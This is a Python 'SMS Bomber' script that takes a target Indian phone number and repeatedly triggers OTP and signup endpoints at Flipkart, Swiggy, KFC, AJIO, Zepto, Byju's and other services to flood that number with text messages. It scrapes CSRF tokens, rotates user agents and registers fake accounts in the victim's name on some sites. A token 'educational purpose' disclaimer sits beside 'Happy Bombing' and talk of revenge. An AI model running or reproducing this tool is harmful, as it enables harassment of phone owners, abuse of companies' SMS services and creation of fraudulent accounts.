#!/usr/bin/python3
import requests
from datetime import datetime
import json
import re
import colorama
import threading
import random
import time
import os
import urllib.parse
import string
from bs4 import BeautifulSoup
delay = 2	# in seconds

success = 0
failed = 0
total = 0
time.sleep(2)	# pause for 2s

# show banner
def banner():
	banner_txt = """
███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
Coded by: An0nym0us H4ck3r
"""
	return banner_txt

# disclaimer
def disclaimer():
	disclaimer_txt = """
[!] Disclaimer: This is just for educational purpose. I'll not be held responsible for actions caused by this software.
Misuse of this tool for revenge purpose can land you in jail. The requests are made through
your IP Address, Hence if you are using to revenge someone, you can be tracked.
Happy Bombing :)
"""
	return disclaimer_txt

# clear the terminal
def clearScr():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")


# list of functions
# that can be used to send SMS's
#===========================BREVISTAY==============================#
def brevistay(number, useragent):

	global success
	global failed

	OTP_URL = "https://www.brevistay.com/cst/app-api/login"
	HEADERS = { "User-Agent": useragent }
	PAYLOAD = { "is_otp": "1", "is_password": "0", "mobile": number }
	HEADERS[ 'brevi-channel' ] = "DESKTOP_WEB"
	HEADERS[ 'brevi-channel-version' ] = "39.3.7"
	session = requests.Session()
	response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS).json()
	if response['is_otp_sent'] == "1":
		print( colorama.Fore.GREEN + "[+] Brevistay: OTP Sent.")
		success += 1
	else:
		print( colorama.Fore.RED + "[!] Brevistay: OTP Failed.")
		failed += 1
#===========================BREVISTAY===============================#

#===========================KFC======================================#
def kfc(number, useragent):

	global success
	global failed

	OTP_URL_DOMAIN = "https://login.kfc.co.in"
	FORM_URL = "https://login.kfc.co.in/auth/realms/ki/protocol/openid-connect/auth?scope=openid+phone+profile+email&response_type=code&client_id=reg54y8ws34xvp9&redirect_uri=https://online.kfc.co.in/login&state=X9BEUW20azUzSWXSerYxSPx4VbAh-x7FoNcL60Vj3bk&code_challenge=vkdTeqjaR6AxNkYjp7gI7QY3sdVyPZiQ_THYHhR_76M&code_challenge_method=S256&platform=undefined&env=UAT"
	HEADERS = { "User-Agent": useragent }
	PAYLOAD = { "mobile": number }
	session = requests.Session()
	htmlResponse = session.get(url=FORM_URL, headers=HEADERS).text
	soup = BeautifulSoup(htmlResponse, 'html.parser')
	ACTION_SESSION_URL = soup.find('form', action=True)['action']
	OTP_URL_DOMAIN = OTP_URL_DOMAIN + ACTION_SESSION_URL
	otpResponse = session.post(url=OTP_URL_DOMAIN, data=PAYLOAD, headers=HEADERS)
	if 'We Just Texted You' in otpResponse.text:
		print( colorama.Fore.GREEN + "[+] KFC: OTP Sent.")
		success += 1
	else:
		print( colorama.Fore.RED + "[!] KFC: OTP Failed.")
		failed += 1
#===========================KFC======================================#

#===========================FLIPKART===================================#
def flipkart(number, useragent):

	global success
	global failed

	OTP_URL = "https://1.rome.api.flipkart.com/api/7/user/otp/generate"
	HEADERS = { "User-Agent": useragent, 
	"X-User-Agent": useragent + ' ' + 'FKUA/website/42/website/Desktop', 
	"Referrer": "https://www.flipkart.com/" }
	PAYLOAD = "{\"loginId\":\"+91"+ number +"\"}"
	session = requests.Session()
	try:
		response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS).json()
		if 'STATUS_CODE' in response:
			if response['STATUS_CODE'] == 200:
				print( colorama.Fore.GREEN + "[+] Flipkart: OTP Sent.")
				success += 1
			else:
				print( colorama.Fore.RED + "[!] Flipkart: OTP Failed.")
				failed += 1
		else:
			print( colorama.Fore.RED + "[!] Flipkart: OTP Failed.")
			failed += 1
	except json.JSONDecodeError as e:
		print( colorama.Fore.RED + "[!] Flipkart: OTP Failed [Captcha Detected].")
		failed += 1
#===========================FLIPKART===================================#

#==========================PHARMEASY=================================#
# def pharmeasy(number, useragent):

# 	global success
# 	global failed

# 	OTP_URL = "https://pharmeasy.in/apt-api/login/send-otp"
# 	HEADERS = { "User-Agent": useragent,
# 		"x-instana-l": "1,correlationType=web;correlationId=88c22e26c2207d8",
# 	    "x-instana-s": "88c22e26c2207d8",
# 	    "x-instana-t": "88c22e26c2207d8",
#     	"referrer": "https://pharmeasy.in/"
#     }
# 	PAYLOAD = {
# 		"param": number
# 	}
# 	session = requests.Session()
# 	response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS).json()
# 	if response["status"] == 1:
# 		print( colorama.Fore.GREEN + "[+] Pharmeasy: OTP Sent.")
# 		success += 1
# 	else:
# 		print( colorama.Fore.RED + "[!] Pharmeasy: OTP Failed.")
# 		failed += 1
#==========================PHARMEASY=================================#

#==========================ZEPTO===================================#
def zepto(number, useragent):

	global success
	global failed

	OTP_URL = "https://api.zepto.co.in/api/v1/user/customer/send-otp-sms/"
	HEADERS = {
		"user-Agent": useragent,
		"appversion": "6.13.4-WEB",
	    "bundleversion": "v1",
	    "compatible_components": "CONVENIENCE_FEE,NEW_FEE_STRUCTURE",
	    "content-type": "application/json; charset=UTF-8",
	    "deviceid": "6133805980064081",
	    "deviceuid": "",
	    "platform": "WEB",
	    "requestid": "7249296797508128",
	    "sessionid": "4331078386815925",
	    "x-requested-with": "XMLHttpRequest",
	    "systemversion": "",
	    "appversion": "6.13.4-WEB",
	    "bundleversion": "v1",
	    "access-control-allow-credentials": "true",
	    "access-control-allow-methods": "GET, POST, OPTIONS",
	    "access-control-allow-origin": "*"
	}
	PAYLOAD = "{\"mobileNumber\":\""+ number +"\"}"
	session = requests.Session()
	response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS).json()
	if "msg" in response:
		if response["msg"] == "OTP Sent.":
			print( colorama.Fore.GREEN + "[+] Zepto: OTP Sent.")
			success += 1
		else:
			print( colorama.Fore.RED + "[!] Zepto: OTP Failed.")
			failed += 1
	else:
		print( colorama.Fore.RED + "[!] Zepto: OTP Failed.")
		failed += 1
#==========================ZEPTO===================================#

#========================INDIAMART==================================#

# THIS SHIT AIN'T WORKING!!

# def indiamart(number, useragent):

# 	global success
# 	global failed

# 	OTP_URL = "https://login.indiamart.com/users/OTPVerification/"
# 	HEADERS = { "User-Agent": useragent }
# 	PAYLOAD = {
# 		"token": "imobile@15061981",
# 		"mobile_num": number,
# 		"glusrid": "149673045",
# 		"modid": "MY",
# 		"user_mobile_country_code": "91",
# 		"flag": "OTPGen",
# 		"user_ip": "40.127.20.182",
# 		"user_country": "IN",
# 		"process": "OTP_SignInForm_Desktop",
# 		"user_updatedusing": "Sign IN Form Desktop",
# 		"OTPResend": "1"
# 	}
# 	session = requests.Session()
# 	response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS).json()
# 	if "Response" in response:
# 		if "Message" in response["Response"]:
# 			if response["Response"]["Message"] == "OTP Sent":
# 				print( colorama.Fore.GREEN + "[+] IndiaMart: OTP Sent.")
# 				success += 1
# 			else:
# 				print( colorama.Fore.RED + "[!] IndiaMart: OTP Failed.")
# 				failed += 1
# 		else:
# 			print( colorama.Fore.RED + "[!] IndiaMart: OTP Failed.")
# 			failed += 1
# 	else:
# 		print( colorama.Fore.RED + "[!] IndiaMart: OTP Failed.")
# 		failed += 1
#========================INDIAMART==================================#

#==========================BYJUS====================================#
def byjus(number, useragent):

	global success
	global failed

	OTP_URL = "https://identity.tllms.com/api/request_otp"
	HEADERS = { "User-Agent": useragent }
	PAYLOAD = "{\"phone\":\"+91-"+ number +"\",\"app_client_id\":\"90381df5-ee50-4268-bd15-1924124e906e\"}"
	session = requests.Session()
	response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS).json()
	if "id" in response:
		if response["id"] == "00000000-0000-0000-0000-000000000000":
			print( colorama.Fore.GREEN + "[+] Byjus: OTP Sent.")
			success += 1
		else:
			print( colorama.Fore.RED + "[!] Byjus: OTP Failed.")
			failed += 1
	else:
		print( colorama.Fore.RED + "[!] Byjus: OTP Failed.")
		failed += 1
#==========================BYJUS====================================#

#==========================BEWAKOOF==================================#
def bewakoof(number, useragent):

	global success
	global failed

	REGISTER_URL = "https://www.bewakoof.com/v1/users"
	OTP_URL = "https://www.bewakoof.com/v1/authentication/generate_otp"
	HEADERS = { 
		"User-Agent": useragent, "x-http-method-override": "POST",
		"content-type": "application/json",
		"api-token": "MWY5ZTNmNzFmN2M1ZTUyMjkwNjM2NGMzNmNjZTA3N2Q6M2RhMmI3OTgtNTY2MC00ZDRhLWJhZWQtNTZlMDI2MWRlYmZm"
	}
	PAYLOAD = "{\"param\":\"generate_otp\",\"authentication\":{\"mobile\":\""+ number +"\"}}"
	session = requests.Session()
	response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS).json()
	if "error" in response:
		if "message" in response["error"]:
			if response["error"]["message"] == "Mobile number not registered.":
				# make user register to site
				LEN = 10
				PASS = 8
				RAND_USER_NAME = "USER" + ''.join(random.choices(string.ascii_uppercase, k = LEN))
				RAND_USER_NAME = str(RAND_USER_NAME)
				RAND_EMAIL = RAND_USER_NAME + "@gmail.com"
				RAND_PASSWORD = ''.join(random.choices(string.ascii_lowercase, k = PASS))
				PAYLOAD = "{\"user\":{\"name\":\""+ RAND_USER_NAME +"\",\"email\":\""+ RAND_EMAIL +"\",\"password\":\""+ RAND_PASSWORD +"\",\"mobile\":\""+ number +"\",\"gender\":\"\",\"referrer_code\":\"\",\"phone_code\":\"+91\"},\"user_setting\":{\"whats_app\":true},\"cart\":false}"
				response = session.post(url=REGISTER_URL, data=PAYLOAD, headers=HEADERS)
				print( colorama.Fore.RED + "[!] Bewakoof: OTP Failed (Unregistered user).")
				failed += 1
		else:
			print(response['message'])
	elif response["message"] == "OTP Sent" or response["message"] == "OTP Resent":
		print( colorama.Fore.GREEN + "[+] Bewakoof: OTP Sent.")
		success += 1
#==========================BEWAKOOF===================================#

#==========================SWIGGY=====================================#
def swiggy(number, useragent):

	global success
	global failed

	MAIN_URL = "https://www.swiggy.com/"
	OTP_URL = "https://www.swiggy.com/dapi/auth/sms-otp"
	REGISTER_URL = "https://www.swiggy.com/dapi/auth/signup"
	HEADERS = { "User-Agent": useragent }
	session = requests.Session()
	htmlInstance = session.get(url=MAIN_URL, headers=HEADERS)
	soup = BeautifulSoup(htmlInstance.text, 'html.parser')
	script = soup.findAll('script')[2]
	script = str(script)
	script = script[31:]
	_csrfToken = script[:40]
	HEADERS = { "User-Agent": useragent, "__fetch_req__": "true",
		"content-type": "application/json",  "referrer": "https://www.swiggy.com/"
	}
	COOKIES = htmlInstance.cookies.get_dict()
	PAYLOAD = "{\"mobile\":\""+ number +"\",\"_csrf\":\""+ _csrfToken +"\"}"
	try:
		response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS, cookies=COOKIES).json()
		if 'statusMessage' in response:
			if response['statusMessage'] == "done successfully":
				print( colorama.Fore.GREEN + "[+] Swiggy: OTP Sent.")
				success += 1
			elif response['statusMessage'] == "user not registered":
				LEN = 10
				RAND_USER_NAME = "USER" + ''.join(random.choices(string.ascii_uppercase, k = LEN))
				RAND_USER_NAME = str(RAND_USER_NAME)
				RAND_EMAIL = RAND_USER_NAME + "@gmail.com"
				PAYLOAD = "{\"mobile\":\""+ number +"\",\"name\":\""+ RAND_USER_NAME +"\",\"email\":\""+ RAND_EMAIL +"\",\"referral\":\"\",\"otp\":\"\",\"_csrf\":\""+ _csrfToken +"\"}"
				loginResponse = session.post(url=REGISTER_URL, data=PAYLOAD, headers=HEADERS).json()
				if 'statusMessage' in loginResponse:
					if 'done successfully' in loginResponse['statusMessage']:
						print( colorama.Fore.GREEN + "[+] Swiggy: OTP Sent.")
						success += 1
					else:
						print( colorama.Fore.RED + "[!] Swiggy: OTP Failed.")
						failed += 1
				else:
					print( colorama.Fore.RED + "[!] Swiggy: OTP Failed.")
					failed += 1
			else:
				print( colorama.Fore.RED + "[!] Swiggy: OTP Failed.")
				failed += 1
	except json.JSONDecodeError as err:
		response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS, cookies=COOKIES).text
		print( colorama.Fore.RED + "[!] Swiggy: OTP Failed (Error parsing JSON).")
		failed += 1
#==========================SWIGGY=====================================#

#==========================AnitaDongre================================#
def anitadongre(numberm, useragent):

	global success
	global failed

	LOGIN_URL = "https://www.anitadongre.com/login"
	OTP_URL = "https://www.anitadongre.com/on/demandware.store/Sites-AD-INDIA-Site/default/Login-VerifyAccount"
	HEADERS = { "User-Agent": useragent }
	session = requests.Session()
	htmlResponse = session.get(url=LOGIN_URL, headers=HEADERS).text
	# print(htmlResponse)
	soup = BeautifulSoup(htmlResponse, 'html.parser')
	csrf_token = soup.findAll('input', {'type': 'hidden'})[1].get('value')
	PAYLOAD = {
		"csrf_token": csrf_token,
		"loginEmailOrPhone": number,
		"mobileCode": "+91",
		"isPhoneNumbe": "true"
	}
	HEADERS["Referer"] = "https://www.anitadongre.com/login"
	HEADERS["Origin"] = "https://www.anitadongre.com"
	HEADERS["X-Requested-With"] = "XMLHttpRequest"
	HEADERS["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
	response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS).text
	if 'Please enter the OTP to verify your phone number' in response:
		print( colorama.Fore.GREEN + "[+] AnitaDongre: OTP Sent.")
		success += 1
	else:
		print( colorama.Fore.RED + "[!] AnitaDongre: OTP Failed.")
		failed += 1
#==========================AnitaDongre================================#

#===========================MYNTRA====================================#

# !!! FIX THIS SHIT LATER !!!

# def myntra(number, useragent):
# 	print("IN Myntra Function")
# 	OTP_URL = "https://www.myntra.com/gateway/v1/auth/getotp"
# 	deviceId =  "ffaa7b5f-e8b0-4755-9657-a97e5dca8e4c"
# 	HEADERS = {
# 		"deviceid": deviceId,
# 		"User-Agent": useragent, "x-requested-with": "browser",
# 		"referrer": "https://www.myntra.com/login?referer=https://www.myntra.com/clothing",
# 		"x-myntraweb": "Yes", "x-location-context": "pincode=400072;source=IP",
# 		"x-meta-app": "deviceId="+ deviceId +";appFamily="+ useragent +";reqChannel=web;channel=web;"
# 	}
# 	PAYLOAD = "{\"phoneNumber\":\""+ number +"\",\"signup\":\"ONECLICK\"}"
# 	session = requests.Session()
# 	response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS)
# 	print("Response: "+ response)
#===========================MYNTRA====================================#

#===========================AJIO=====================================#
def ajio(number, useragent):

	global success
	global failed

	OTP_URL = "https://login.web.ajio.com/api/auth/signupSendOTP"
	HEADERS = { "User-Agent": useragent, "referrer": "https://www.ajio.com/" }
	LEN = 10
	RAND_USER_NAME = "USER" + ''.join(random.choices(string.ascii_uppercase, k = LEN))
	RAND_USER_NAME = str(RAND_USER_NAME)
	RAND_EMAIL = RAND_USER_NAME + "@gmail.com"
	PAYLOAD = {
		"firstName": RAND_USER_NAME,
		"login": RAND_EMAIL,
		"genderType": "Female",
		"mobileNumber": number,
		"rilFnlRegisterReferralCode":"",
		"requestType":"SENDOTP",
		"newDesign":"false"
	}
	session = requests.Session()
	response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS, cookies={ "ul": number }).json()
	if "statusCode" in response:
		if response["statusCode"] == "1":
			print( colorama.Fore.GREEN + "[+] AJIO: OTP Sent.")
			success += 1
		else:
			print( colorama.Fore.RED + "[!] AJIO: OTP Failed.")
			failed += 1
	else:
		print( colorama.Fore.RED + "[!] AJIO: OTP Failed.")
		failed += 1
#===========================AJIO=====================================#

#===========================COLLECTIVE=====================================#

# THIS SHIT AIN'T WORKING TOO !!!

# def collective(number, useragent):

# 	global success
# 	global failed

# 	OTP_URL = "https://www.thecollective.in/capillarylogin/registerOtp?isAjax=true"
# 	HEADERS = { "User-Agent": useragent }
# 	PAYLOAD = {
# 		"mobileEmail": number
# 	}
# 	session = requests.Session()
# 	response = session.post(url=OTP_URL, data=PAYLOAD, headers=HEADERS).json()
# 	if "Status" in response and "success" in response:
# 		if response["Status"] == True and response["success"] == "<div class='error_msg'><div class='alertflash alert alert-success'><div>OTP has been sent to your mobile number. Please enter below.</div></div></div>":
# 			print( colorama.Fore.GREEN + "[+] Collective: OTP Sent.")
# 			success += 1
# 		else:
# 			print( colorama.Fore.RED + "[!] Collective: OTP Failed.")
# 			failed += 1
# 	else:
# 		print( colorama.Fore.RED + "[!] Collective: OTP Failed.")
# 		failed += 1
#===========================COLLECTIVE=====================================#

clearScr()
print( colorama.Fore.GREEN + banner())
print( colorama.Fore.CYAN + disclaimer())
try:
	number = str(input(colorama.Fore.YELLOW + "[+] Enter target number: +91 " + colorama.Fore.LIGHTYELLOW_EX))
	qty = int(input(colorama.Fore.YELLOW + "[+] Enter no. of SMS to send: " + colorama.Fore.LIGHTYELLOW_EX))
	delay = int(input(colorama.Fore.YELLOW + "[+] Enter time delay (seconds): " + colorama.Fore.LIGHTYELLOW_EX))

	if len(number) < 10:
		print( colorama.Fore.RED + "\n[!] Please enter a valid number.")
		exit(-1)

	# get list of user agents
	with open('user-agents.txt', 'r') as f:
		agents = f.read()

	# get a random user agent
	agents = agents.split('\n')
	randomuseragent = random.choice(agents)

	i = 0	# start loop

	while i < qty:
		i += 1
		t1 = threading.Thread(target=brevistay, args=(number, randomuseragent))
		t1.start()
		t1.join()
		time.sleep(delay)
		t2 = threading.Thread(target=kfc, args=(number, randomuseragent))
		t2.start()
		t2.join()
		time.sleep(delay)
		t3 = threading.Thread(target=flipkart, args=(number, randomuseragent))
		t3.start()
		t3.join()
		time.sleep(delay)
		# t4 = threading.Thread(target=pharmeasy, args=(number, randomuseragent))
		# t4.start()
		# t4.join()
		# time.sleep(delay)
		t5 = threading.Thread(target=zepto, args=(number, randomuseragent))
		t5.start()
		t5.join()
		time.sleep(delay)
		# t6 = threading.Thread(target=indiamart, args=(number, randomuseragent))
		# t6.start()
		# t6.join()
		time.sleep(delay)
		t7 = threading.Thread(target=byjus, args=(number, randomuseragent))
		t7.start()
		t7.join()
		time.sleep(delay)
		t8 = threading.Thread(target=bewakoof, args=(number, randomuseragent))
		t8.start()
		t8.join()
		time.sleep(delay)
		t9 = threading.Thread(target=swiggy, args=(number, randomuseragent))
		t9.start()
		t9.join()
		t10 = threading.Thread(target=anitadongre, args=(number, randomuseragent))
		t10.start()
		t10.join()
		t11 = threading.Thread(target=ajio, args=(number, randomuseragent))
		t11.start()
		t11.join()
		# t12 = threading.Thread(target=collective, args=(number, randomuseragent))
		# t12.start()
		# t12.join()
		print("================================================================")
		time.sleep(delay)

	print("\n")
	print(colorama.Fore.YELLOW + "[+] Success OTPs: " + colorama.Fore.LIGHTYELLOW_EX + str(success))
	print(colorama.Fore.YELLOW + "[+] Failed OTPs: " + colorama.Fore.LIGHTYELLOW_EX + str(failed))
	print(colorama.Fore.YELLOW + "[+] Total OTPs: " + colorama.Fore.LIGHTYELLOW_EX + str(success + failed))
	print( colorama.Fore.WHITE )

except KeyboardInterrupt as e:
	print( colorama.Fore.RED + "\n[!] Program exited by user." + colorama.Fore.WHITE)
	exit(0)